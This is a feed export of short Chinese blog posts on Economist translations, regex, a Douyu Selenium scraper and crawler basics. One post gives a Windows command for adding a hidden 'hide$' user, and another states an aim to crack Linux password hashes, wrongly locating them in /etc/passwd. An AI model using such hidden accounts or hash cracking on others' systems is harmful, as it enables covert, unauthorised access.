<h2 id="google引发的一场内心戏"><a href="#google引发的一场内心戏" class="headerlink" title="google引发的一场内心戏"></a>google引发的一场内心戏</h2><p>Google是我最喜欢的搜索引擎，然而今天有一道搜索题，要求通过google搜索得出“基于P/V相等换算”的英语译文。然而同事给了他的答案，并且说我的搜索结果肯定不是最优解，好的，成功燃起了我的胜负欲。<br>于是，下班回家第一件事，就是打开google，想办法得出更好的结果以证明他的结果也不是最优解。哈哈，感觉有点小心眼。<br>借鉴这位同事的思路，另辟一条思路，最后自认为我的结果非常具有普遍性和可用性，个人认为比他的结果更好。然后我就兴高采烈地把这些写下来，发给他了。还没收到回复，但是我就是有一种胜利的喜悦感。<br>有时候就是这么好胜。</p>
]]></content>
      <categories>
        <category>personal</category>
      </categories>
      <tags>
        <tag>personal</tag>
      </tags>
  </entry>
  <entry>
    <title>新大陆-win10内置了ssh服务</title>
    <url>//posts/ZH-CN/Win10_Ssh_Builtin.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>才知道，win10内置了ssh服务，可以用于远程连接服务器。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="win10的ssh服务"><a href="#win10的ssh服务" class="headerlink" title="win10的ssh服务"></a>win10的ssh服务</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcx35swx5nj30xz0hrjs9.jpg" alt="image.png"></p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>win10</tag>
        <tag>ssh服务</tag>
      </tags>
  </entry>
  <entry>
    <title>新朋友：马里向俄罗斯求助</title>
    <url>//posts/ZH-CN/Espresso-Economics-Marathon-86day.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经济学人浓咖啡马拉松计划doing！第-86天。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="喝吧"><a href="#喝吧" class="headerlink" title="喝吧"></a>喝吧</h2><p>New friends: Mali turns to Russia</p>
<p>新朋友：马里向俄罗斯求助</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/11/brett-jordan-erLrY4aKztg-unsplash.jpg" alt="brett-jordan-erLrY4aKztg-unsplash.jpg"></p>
<p>On Thursday Sergei Lavrov, Russia’s foreign minister, will meet Abdoulaye Diop, his Malian counterpart in Moscow.</p>
<p>周四，俄罗斯外交部长Sergei Lavrov将在莫斯科会见马里外交部长Abdoulaye Diop。</p>
<p>Mali is reportedly close to recruiting Wagner Group, a controversial Russian mercenary outfit, to fight its jihadist insurgency.</p>
<p>据报道，马里即将雇佣瓦格纳集团（瓦格纳集团是备受争议的俄罗斯雇佣军机构）打击圣战分子叛乱。</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/11/wagner-group.png" alt="wagner-group.png"></p>
<p>Deaths in the country resulting from the conflict have risen from about 430 in 2015 to more than 2,800 last year.</p>
<p>2015年这场叛乱导致大约430人丧生，而去年致死人数上涨到了2800多人。</p>
<p>The possibility of Russian involvement was first reported after France—which has about 5,000 troops in Burkina Faso, Mali and Niger fighting jihadists—said it would close several bases in northern Mali and eventually halve its operation.</p>
<p>继法国之后，首次报道了俄罗斯参与圣战的可能性。法国在布基纳法索、马里和尼日尔部署了5000军队与圣战分子对抗，并声称将关闭在马里北部的几个基地，最终将军事行动减半。</p>
<p>（图源：半岛官网报道）</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/11/bandao.png" alt="bandao.png"></p>
<p>Yet the prospect of Russian mercenary involvement has angered France.</p>
<p>俄罗斯雇佣军却即将参与圣战，这激怒了法国。</p>
<p>Its relationship with Mali had already soured after soldiers there staged a second coup within 12 months in May.</p>
<p>今年5月，圣战分子在一年内发动了第二次政变，此后，法国和马里的关系就已经恶化。</p>
<p>（图源：FRI-7月3日报道）</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/11/FRI.png" alt="FRI.png"></p>
<p>The putschists had promised to hold elections in February next year but this week abandoned that timeline.</p>
<p>政变者承诺明年2月将举行选举，但这周却取消了选举日程。</p>
<p>For long-suffering Malians, there is little relief in sight.</p>
<p>长期饱受苦难的马里人民几乎看不到战争缓解的希望。</p>
<p>圣战分子也就是恐怖分子。通俗讲，法国和俄罗斯都是马里的大哥，法国是大哥1号，俄罗斯是大哥2号。小弟有难，要找大哥求助。一直以来都是大哥1号罩着马里，但是由于5月的第二次政变，大哥1号已经对马里失望了，准备撤军，让马里自己收拾烂摊子。于是小弟向大哥2号求助，并且大哥2号有意向伸出援手。这时候大哥1号面子挂不住，于是怒了。至于大哥2号会不会真的揽下这个摊子，还有待观察。不管怎么样，马里人民的日子都不好过。</p>
]]></content>
      <categories>
        <category>经济学人</category>
      </categories>
      <tags>
        <tag>I期马拉松</tag>
        <tag>经济学人</tag>
        <tag>浓咖啡</tag>
      </tags>
  </entry>
  <entry>
    <title>查看linux机器使用的加密算法</title>
    <url>//posts/ZH-CN/linux-encrypt-authconfig.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>/etc/passwd存放了用户名及密码信息，其中的密码是密文。我们怎么看这个密文的加密算法？主要是想试试怎么根据密文破解出用户的密码。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>使用以下命令查看机器使用的加密算法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">authconfig --test | grep hashing</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/Zvdd"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/15/image.png" alt="image.png"></a><br>我看了下自己手里的机器，几乎都是使用sha512加密算法，暂时没破解出来。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考了这篇<a href="https://blog.csdn.net/lws123253/article/details/89228589">文章</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>加密算法</tag>
      </tags>
  </entry>
  <entry>
    <title>查看win10的用户和用户组</title>
    <url>//posts/ZH-CN/windows10-user-usergroup.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>windows的用户用户组相关的DOS命令。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="DOS命令"><a href="#DOS命令" class="headerlink" title="DOS命令"></a>DOS命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup 查看用户组</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/xFN9"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/08/image7610bc257e31ebf6.png" alt="image7610bc257e31ebf6.png"></a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user 查看用户</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/xSTO"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/08/imagea1ede322b11deea5.png" alt="imagea1ede322b11deea5.png"></a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user hide$ password /add 添加隐藏用户</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cipher 查看加密文件</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/xWm6"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/08/image09234d7221a28f7f.png" alt="image09234d7221a28f7f.png"></a></p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows10</tag>
        <tag>查看用户和用户组</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式-不匹配特定字符串开头的url</title>
    <url>//posts/ZH-CN/Reg-Exclude-url.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一直都有个需求，写出一个正则表达式，不匹配以某个目录开头的url，主要是工作中需要用到，以前不会写这个表达式，就干脆没有做相关配置，这回终于找到方法了。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么写正则"><a href="#怎么写正则" class="headerlink" title="怎么写正则"></a>怎么写正则</h2><p><code>?!</code>这叫做<code>前瞻匹配</code>，意思就是以啥啥啥开头。<br>我需要匹配不以某个目录开头的url，这样写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(?i)^(?!/plugin).*?$</span><br></pre></td></tr></table></figure>
<p>这个表达式意思就是：不匹配以<code>/plugin</code>开头的url。<br>之前我们还写过排除匹配特定url的正则表达式，这样写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(?i)^(?!/test.html($|\?.+))</span><br></pre></td></tr></table></figure>
<p>这个表达式意思就是：不匹配<code>/test.html</code>这个url。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考了<a href="https://www.cnblogs.com/asfeixue/p/lookahead.html">这篇文章</a>，OK，这种正则表达式的官方名字叫<code>否定前瞻</code>。</p>
]]></content>
      <categories>
        <category>正则表达式</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
        <tag>前瞻匹配</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式之排除匹配</title>
    <url>//posts/ZH-CN/Reg_Exclude.html</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>排除匹配特定的url地址。并且这些url地址具有相似性，可以使用正则表达式匹配。</p>
<blockquote>
<p>例如，我需要排除匹配这些url<br><a href="http://www.baidu.com/source/qqqqq.html">www.baidu.com/source/qqqqq.html</a><br><a href="http://www.baidu.com/source/mkoihihio.html">www.baidu.com/source/mkoihihio.html</a><br><a href="http://www.baidu.com/source/test/ooo.html">www.baidu.com/source/test/ooo.html</a><br><a href="http://www.photo.com/6515423354.jpg">www.photo.com/6515423354.jpg</a><br><a href="http://www.photo.com/photo/15648412.png">www.photo.com/photo/15648412.png</a><br><a href="http://www.photo.com/js/9773099.js">www.photo.com/js/9773099.js</a></p>
</blockquote>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p><code>(?i)^(?!(^(www.baidu.com/source).*.html|^(www.photo.com).*.jpg|^(www.photo.com).*.png|^(www.photo.com).*.js)($|\?.+))</code><br><code>(?i)</code>表示匹配时不区分大小写。<br><code>?!</code>表示排除匹配，意思就是把匹配到的内容都排除了，去匹配那些<code>没匹配到的内容</code>，返回的结果是<code>没匹配到的内容</code>。- 😓有点绕口了，道理就是这么个道理。<br><code>^(www.baidu.com/source).*.html</code>表示匹配以<code>www.baidu.com/source</code>开头，以<code>.html</code>结尾的内容。<br><code>|</code>表示或者。</p>
]]></content>
      <categories>
        <category>正则表达式</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
        <tag>排除匹配</tag>
      </tags>
  </entry>
  <entry>
    <title>没有iphone也没有mac怎么创建appleid</title>
    <url>//posts/ZH-CN/BlackApple_Appleid.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>装好黑苹果，要使用的话，得有appleid，不然很多功能没法用。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么创建appleid"><a href="#怎么创建appleid" class="headerlink" title="怎么创建appleid"></a>怎么创建appleid</h2><p>本人没有iphone也没有mac，怎么创建appleid？<br>在PC端可操作。进入<a href="https://appleid.apple.com/">网站</a>填写信息创建即可。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.youtube.com/watch?v=lMl5w2jQFak">视频教程</a></p>
]]></content>
      <categories>
        <category>黑苹果</category>
      </categories>
      <tags>
        <tag>创建appleid</tag>
      </tags>
  </entry>
  <entry>
    <title>治疗新冠的首个抗病毒口服药物：莫纳皮拉韦</title>
    <url>//posts/ZH-CN/Espresso-Economics-Marathon-93day.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经济学人浓咖啡马拉松计划doing！第-93天。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="喝吧"><a href="#喝吧" class="headerlink" title="喝吧"></a>喝吧</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/05/1280px-MK-4482.svg.png" alt="1280px-MK-4482.svg.png"></p>
<p>Britain became the first country to approve Molnupiravir, the first oral antiviral medicine available to treat covid-19.</p>
<p>英国成为第一个批准莫纳皮拉韦上市的国家。莫纳皮拉韦是首个可治疗新冠的抗病毒口服药物。</p>
<p>（莫纳皮拉韦（英语：Molnupiravir，开发代码MK-4482和EIDD-2801）是默克药厂与瑞奇贝克医疗公司（英语：Ridgeback Therapeutic）开发的一种抗病毒药物，可口服。最初被用来治疗流行性感冒，近来被用作对抗新冠病毒。 它是人工合成的核苷衍生物N4-hydroxycytidine的前体药物，在病毒RNA复制过程中通过引入差错而起抗病毒作用。）</p>
<p>Trials of the drug—manufactured by Merck, a pharma company, and Ridgeback Biotherapeutics, a biotech firm—have shown that patients with a risk factor for covid-19 were 50% less likely to be hospitalised or die if the drug was taken within five days of symptoms arising.</p>
<p>莫纳皮拉韦由德国制药公司默克（Merck）与美国公司Ridgeback Bio合作研发，药物试验表明，对于有危险因子的新冠患者，如果在症状出现的前5天之内服用莫纳皮拉韦，重症或死亡率将减少50%。</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/05/Merck.png" alt="Merck.png"></p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/05/rigeback-bio.png" alt="rigeback-bio.png"></p>
<p>“Be well”——健康是福。希望大家都平安渡过这个寒冬。</p>
]]></content>
      <categories>
        <category>经济学人</category>
      </categories>
      <tags>
        <tag>I期马拉松</tag>
        <tag>经济学人</tag>
        <tag>浓咖啡</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实例之selenium斗鱼爬虫</title>
    <url>//posts/ZH-CN/Spider_Selenium_Fish.html</url>
    <content><![CDATA[<h2 id="爬什么"><a href="#爬什么" class="headerlink" title="爬什么"></a>爬什么</h2><p>把斗鱼直播的所有房间信息爬取到本地并保存。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>为了练习selenium模块驱动无头浏览器进行爬虫，导入selenium的webdriver模块进行爬虫。<br>思路：</p>
<ol>
<li>找到目标数据的请求url</li>
<li>提取数据</li>
<li>保存数据</li>
</ol>
<p>本来是要练习发送翻页请求，但是现在斗鱼网站的翻页按钮不在html响应体中，可能是由js生成，目前的知识水平还无法完成翻页。所以，就只是抓取了第一页的数据。<br>提取数据可以使用selenium模块的<code>find_element_by_xpath</code>，但是我实验了多次，这个定位方式有问题。于是换了以前学过的方式，用lxml的etree模块将html响应转换为html对象，再对这个html对象做xpath。<br>而selenium模块获取html响应的属性是<code>driver.page_source</code>。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># import time</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DouyuSpider</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.strat_url = <span class="string">&quot;https://www.douyu.com/directory/all&quot;</span></span><br><span class="line">        self.driver = webdriver.Chrome(<span class="string">r&quot;E:\chromedriver_win32\chromedriver.exe&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_content_list</span>(<span class="params">self</span>):</span></span><br><span class="line">        page_source = self.driver.page_source <span class="comment">#获取响应html</span></span><br><span class="line">        <span class="comment"># print(page_source)</span></span><br><span class="line">        html = etree.HTML(page_source) <span class="comment">#将html转换为对象</span></span><br><span class="line">        <span class="comment">#1. 分组（一个房间信息在一个li标签里面）</span></span><br><span class="line">        li_list = html.xpath(<span class="string">&quot;//div[@class=&#x27;layout-Module-container layout-Cover ListContent&#x27;]//li&quot;</span>)</span><br><span class="line">        content_list = []</span><br><span class="line">        <span class="comment">#2. 提取所需数据</span></span><br><span class="line">        <span class="keyword">for</span> li <span class="keyword">in</span> li_list:</span><br><span class="line">            item = &#123;&#125;</span><br><span class="line">            item[<span class="string">&quot;img&quot;</span>] = li.xpath(<span class="string">&quot;.//div[@class=&#x27;LazyLoad is-visible&#x27;]/img/@src&quot;</span>)</span><br><span class="line">            <span class="comment"># print(item[&quot;img&quot;])</span></span><br><span class="line">            item[<span class="string">&quot;title&quot;</span>] = li.xpath(<span class="string">&quot;.//div[@class=&#x27;DyListCover-content&#x27;]/div[1]/h3/text()&quot;</span>)</span><br><span class="line">            <span class="comment"># print(item[&quot;title&quot;])</span></span><br><span class="line">            item[<span class="string">&quot;category&quot;</span>] = li.xpath(<span class="string">&quot;.//div[@class=&#x27;DyListCover-content&#x27;]/div[1]/span/text()&quot;</span>) <span class="comment">#这个div[1]指的是第一个div标签</span></span><br><span class="line">            <span class="comment"># print(item[&quot;category&quot;])</span></span><br><span class="line">            item[<span class="string">&quot;author&quot;</span>] = li.xpath(<span class="string">&quot;.//div[@class=&#x27;DyListCover-content&#x27;]/div[2]/h2/text()&quot;</span>)</span><br><span class="line">            <span class="comment"># print(item[&quot;author&quot;])</span></span><br><span class="line">            item[<span class="string">&quot;hot&quot;</span>] = li.xpath(<span class="string">&quot;.//div[@class=&#x27;DyListCover-content&#x27;]/div[2]/span/text()&quot;</span>)</span><br><span class="line">            <span class="comment"># print(item[&quot;hot&quot;])</span></span><br><span class="line">            <span class="built_in">print</span>(item)</span><br><span class="line">            content_list.append(item)</span><br><span class="line">        <span class="comment">#3. 获取下一页的元素</span></span><br><span class="line">        <span class="comment"># next_url = self.driver.find_elements_by_xpath(&quot;//span[@class=&#x27;dy-Pagination-item-custom&#x27;]&quot;)</span></span><br><span class="line">        <span class="comment"># next_url = next_url[0] if len(next_url)&gt;0 else None</span></span><br><span class="line">        <span class="comment"># print(next_url)</span></span><br><span class="line">        <span class="keyword">return</span> content_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_content_list</span>(<span class="params">self,content_list</span>):</span> <span class="comment">#保存数据到本地</span></span><br><span class="line">        <span class="keyword">for</span> content <span class="keyword">in</span> content_list:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;douyu.txt&quot;</span>,<span class="string">&quot;a&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(json.dumps(content,ensure_ascii=<span class="literal">False</span>,indent=<span class="number">2</span>)) <span class="comment">#json.dumps将数据内容以美化的格式写入到文本文件</span></span><br><span class="line">                f.write(<span class="string">&quot;\n&quot;</span>) <span class="comment">#写入换行符</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span> <span class="comment">#实现主要逻辑</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#1. strat_url</span></span><br><span class="line">        <span class="comment">#2. 发送请求，获取响应</span></span><br><span class="line">        self.driver.get(self.strat_url)</span><br><span class="line">        <span class="comment">#3. 提取数据，获取下一页的元素</span></span><br><span class="line">        content_list = self.get_content_list()</span><br><span class="line">        <span class="comment">#4. 保存数据</span></span><br><span class="line">        self.save_content_list(content_list)</span><br><span class="line">        self.driver.quit() <span class="comment">#退出浏览器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: <span class="comment">#主函数</span></span><br><span class="line">    douyu = DouyuSpider()</span><br><span class="line">    douyu.run()</span><br></pre></td></tr></table></figure>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>用pycharm安装lxml模块始终不成功，不晓得是什么原因。<br>xpath提取数据，可以用<code>div[1]</code>表示第一个div标签，<code>div[last()]</code>表示最后一个div标签。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbypaqmg12j31f60u0n4g.jpg" alt="image.png"><br>xpath虽然简单，但是一定要特别注意，element里面看到的内容，和html响应的内容是否有区别，xpath以html响应的内容为准。在写xpath之前，就要明确这个问题，否则更改错误的xpath浪费时间。</p>
]]></content>
      <categories>
        <category>python爬虫实例</category>
      </categories>
      <tags>
        <tag>python爬虫实例</tag>
        <tag>斗鱼爬虫</tag>
        <tag>selenium模块的应用</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器插件-HTTP抓包工具HTTP Header Live</title>
    <url>//posts/ZH-CN/HTTP_Header_Live.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在今天以前，我抓取实时HTTP请求一般使用浏览器的F12（开发者工具），实在复杂的分析，就用burpsuite代理抓包。用F12，界面小，对视力要求比较高。用burpsuite又显得大材小用了，杀鸡焉用牛刀？何况每次开burpsuite代理还得另外开软件，设置浏览器代理，从操作步骤来说，略繁琐。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="好用的HTTP抓包工具"><a href="#好用的HTTP抓包工具" class="headerlink" title="好用的HTTP抓包工具"></a>好用的HTTP抓包工具</h2><p>今天了解到这个HTTP实时抓包工具<code>HTTP Header Live</code>，是一款浏览器插件，点击插件按钮就可以直接抓包，界面友好，并且还能发包。<br>firefox浏览器：<a href="https://addons.mozilla.org/en-US/firefox/addon/http-header-live/">插件下载地址</a></p>
<h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcz7ge4fpyj30rc0kmq4q.jpg" alt="image.png"></p>
<h4 id="发包"><a href="#发包" class="headerlink" title="发包"></a>发包</h4><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcz7e3sq1bj30rc0kmmy6.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcz7ig5gskj30rc0kmmy7.jpg" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://youtu.be/OpDnhQdBk-U">参考这个YTB视频教程</a></p>
]]></content>
      <categories>
        <category>工具</category>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>浏览器插件</tag>
        <tag>HTTP Header Live</tag>
        <tag>HTTP抓包工具</tag>
      </tags>
  </entry>
  <entry>
    <title>爬虫进阶总结</title>
    <url>//posts/ZH-CN/Spider_Summary_Pro.html</url>
    <content><![CDATA[<h2 id="知识树"><a href="#知识树" class="headerlink" title="知识树"></a>知识树</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbwdacyzfij31zb22vdqe.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><p>主要就是学习使用selenium模块的webdriver驱动无头浏览器，爬取动态页面的内容。webdriver的优势在于，可以模拟用户的输入和点击行为。学了chromedriver和phantonjs这两种无头浏览器。chromedriver比较方便观察爬虫的现象，因为本地电脑安装了谷歌浏览器，用webdriver调用chromedriver时，会呈现出GUI。</p>
]]></content>
      <categories>
        <category>基础知识大漫灌</category>
        <category>python爬虫通识</category>
      </categories>
      <tags>
        <tag>学习总结</tag>
        <tag>爬虫通识</tag>
      </tags>
  </entry>
  <entry>
    <title>爬虫通识</title>
    <url>//posts/ZH-CN/Spider_Normal.html</url>
    <content><![CDATA[<h2 id="囫囵吞枣，好像不太难"><a href="#囫囵吞枣，好像不太难" class="headerlink" title="囫囵吞枣，好像不太难"></a>囫囵吞枣，好像不太难</h2><p>一口气看了18个视频。三分钟的热度谁也拦不了我<del>~</del><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gazyt2iy75j30lp0f0wfx.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="flag立在这儿"><a href="#flag立在这儿" class="headerlink" title="flag立在这儿"></a>flag立在这儿</h2><p>明天继续，通识。完成通识部分的爬虫练习。不能偷懒。<br>明天把这些都过一遍。打仗一样的仗势，只管冲就是。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gazyw7ghudj30na09ot9h.jpg" alt="image.png"></p>
<h2 id="今天学了啥"><a href="#今天学了啥" class="headerlink" title="今天学了啥"></a>今天学了啥</h2><p>主要就是讲了爬虫是怎么回事。一句话概况，就是伪装成浏览器，向服务器发起请求，骗取响应数据。爬虫学得好不好，就看你会不会装。装得越像浏览器，段位就越高。<br>今天有点晚了。明天早点起来，总结消化今天学的超大容量知识点。<br>jupyter notebook确实好用。可以把随手做的python练习和笔记保存为markdown。明天复习就有点眉目了。</p>
]]></content>
      <categories>
        <category>基础知识大漫灌</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>通识</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>爬虫通识（一）总结</title>
    <url>//posts/ZH-CN/Spider_Summary_One.html</url>
    <content><![CDATA[<h2 id="知识树"><a href="#知识树" class="headerlink" title="知识树"></a>知识树</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0je3qzv0j33wb2a3aq0.jpg" alt="通用爬虫通识（一）.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="基础得不能再基础"><a href="#基础得不能再基础" class="headerlink" title="基础得不能再基础"></a>基础得不能再基础</h2><h3 id="http请求的过程"><a href="#http请求的过程" class="headerlink" title="http请求的过程"></a>http请求的过程</h3><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0jlt5h6jj30kq08wgoc.jpg" alt="http请求的过程.png"><br>注意：浏览器渲染出来的页面和爬虫请求的页面并不一样。为啥？因为浏览器呈现的内容，除了来自用户手动发起的url请求，还来自于一些js和css文件，这些是存在服务器的。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0jq0c8tkj31f60u0jwu.jpg" alt="爬虫请求的页面和渲染出来的页面不同.png"></p>
<h3 id="url的形式"><a href="#url的形式" class="headerlink" title="url的形式"></a>url的形式</h3><p>形式   <code>scheme://host[:port#]/path/…/[?query-string][#anchor]</code></p>
<blockquote>
<p>scheme：协议(例如：http, https, ftp)<br>host：服务器的IP地址或者域名<br>port：服务器的端口<br>path：访问资源的路径<br>query-string：参数，发送给http服务器的数据<br>anchor：锚（跳转到网页的指定锚点位置）<br><a href="http://localhost:4000/file/part01/1.2.html">http://localhost:4000/file/part01/1.2.html</a><br><a href="http://item.jd.com/11936238.html#product-detail">http://item.jd.com/11936238.html#product-detail</a></p>
</blockquote>
<h3 id="http请求的形式"><a href="#http请求的形式" class="headerlink" title="http请求的形式"></a>http请求的形式</h3><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0jx0ujn6j30h9064mxy.jpg" alt="http请求的形式.png"><br>注意：get请求没有请求体</p>
<h3 id="常见http请求头"><a href="#常见http请求头" class="headerlink" title="常见http请求头"></a>常见http请求头</h3><blockquote>
<p>Host (主机和端口号)<br>Connection (链接类型) //值为<code>keep-alive</code>表示这是条长连接，用于会话保持<br>Upgrade-Insecure-Requests (升级为HTTPS请求)<br>User-Agent (浏览器名称)<br>Accept (传输文件类型)<br>Referer (页面跳转处)<br>Accept-Encoding（文件编解码格式）<br>Cookie （Cookie）<br>x-requested-with: XMLHttpRequest  (是Ajax 异步请求)</p>
</blockquote>
<h3 id="python3中的字符串"><a href="#python3中的字符串" class="headerlink" title="python3中的字符串"></a>python3中的字符串</h3><p>python3的字符串，分两种类型：<code>bytes</code>（二进制形式）、<code>str</code>（unicode形式）<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0keg24dfj30qg0c3dgl.jpg" alt="字符串类型str和bytes.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0kgvx1paj30jc0ezmxt.jpg" alt="bytes转str.png"><br>在ipython里面（jupyter notebook环境）unicode编码可以直接转换为汉字。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0ninytvpj30jt03lt8m.jpg" alt="image.png"></p>
<ul>
<li>应用<br>爬取网上的图片，将图片保存到本地。<br>脚本：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&quot;https://www.liaoxuefeng.com/files/attachments/1087739342615520/l&quot;</span>) <span class="comment">#请求图片链接，获取响应</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.png&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f: <span class="comment">#以二进制方式写入并保存图片</span></span><br><span class="line">    f.write(response.content) <span class="comment">#将响应的二进制内容写入文件</span></span><br></pre></td></tr></table></figure>

<h2 id="requests模块的使用"><a href="#requests模块的使用" class="headerlink" title="requests模块的使用"></a>requests模块的使用</h2><p>使用模块之前，记得<code>import requests</code></p>
<h3 id="安装第三方模块的方法"><a href="#安装第三方模块的方法" class="headerlink" title="安装第三方模块的方法"></a>安装第三方模块的方法</h3><ul>
<li><code>pip3 install 模块名</code></li>
<li><code>pip3 install *.whl</code></li>
